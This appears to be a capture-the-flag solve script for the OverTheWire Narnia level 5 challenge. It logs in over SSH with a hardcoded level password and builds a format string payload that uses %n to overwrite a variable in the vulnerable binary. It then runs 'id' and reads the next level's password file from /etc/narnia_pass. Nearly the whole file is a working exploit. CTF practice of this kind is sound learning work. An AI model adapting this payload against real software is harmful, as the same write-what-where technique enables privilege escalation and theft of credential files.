#!/usr/bin/env python
#encoding:utf-8

import os
from ctf import *
from libformatstr import FormatStr
from libformatstr import make_pattern, guess_argnum

level = 5
host = 'narnia.labs.overthewire.org'
user = 'narnia%d' % level
bin_file = 'narnia%d' % level
password = 'faimahchiy'
pass_file = '/etc/narnia_pass/narnia%d' % (level + 1)
bin_path = '/narnia/%s' % bin_file
source_path = '/narnia/%s.c' % bin_file

# context.log_level = 'debug'
shell = ssh(host=host, user=user, password=password)
# Download challenge related files if not exists.
if not os.path.exists(bin_file):
    shell.download_file(bin_path)
    shell.download_file(source_path)

buf_size = 0x40
io = shell.run([bin_path, make_pattern(buf_size)])
output_buf = io.recvregex('buffer : \[([^]]+)\]', group=1)
argnum, padding = guess_argnum(output_buf, buf_size)
log.info('argnum = %d, padding = %d', argnum, padding)
addr = int(io.recvregex('i = .* \(0x([a-z0-9]+)\)', group=1), 16)
log.info('address of i: %#x', addr)
io.close()

# Here we put address at the begining to avoid finding argnum of argv[1].
# p = FormatStr()
# p[addr] = 500
# payload = p.payload(argnum, padding)
payload = p32(addr)
payload += '%{count}c%{pos}$n'.format(count=500 - len(payload), pos=argnum)
payload = ljust(payload, buf_size)
io = shell.run([bin_path, payload])
io.clean()

io.sendline('id')
log.info('id: %s' % io.recv())
io.sendline('cat %s' % pass_file)
password = io.recv()
log.success('Password: %s' % password)
